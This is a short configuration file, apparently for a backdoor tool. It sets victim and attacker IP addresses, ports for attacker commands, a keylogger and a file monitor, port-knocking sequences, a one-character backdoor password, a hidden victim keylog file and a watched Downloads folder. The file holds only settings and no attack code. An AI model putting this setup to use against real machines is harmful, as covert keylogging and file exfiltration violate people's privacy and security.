# Victim Port
victim_port = 8000

# Attacker port, varies for each feature
attacker_command_port = 6000
attacker_keylogger_port = 6001
attacker_monitor_port = 6002

# IP addresses
victim_ip = "10.0.0.109"
attacker_ip = "10.0.0.224"

# Port knocking sequence to open and close the attacker server
keylog_knock_sequence = [6767, 6767, 6768, 6767]
monitor_knock_sequence = [8888, 8888, 8889, 8888]

# File to save output for keylogger / file monitoring
keylog_file = "keylog.txt"
monitor_file = "monitor.txt"

# amount of time (in seconds) that the server will stay open after successful port knocking
keylog_alive = 60
monitor_alive = 60

# Change this to TCP if you wish to use TCP for sending/receiving commands.
# However, file monitoring and keylogging will continue to run with UDP packets.
protocol = "udp"

# Password to authenticate backdoor packets
auth_password = "a"


############################ VICTIM SPECIFIC ############################

# Path to monitor
watch_path = "/home/sy/Downloads"

# Keylog file for victim to store keystrokes
victim_keylog_file = ".keylog.txt"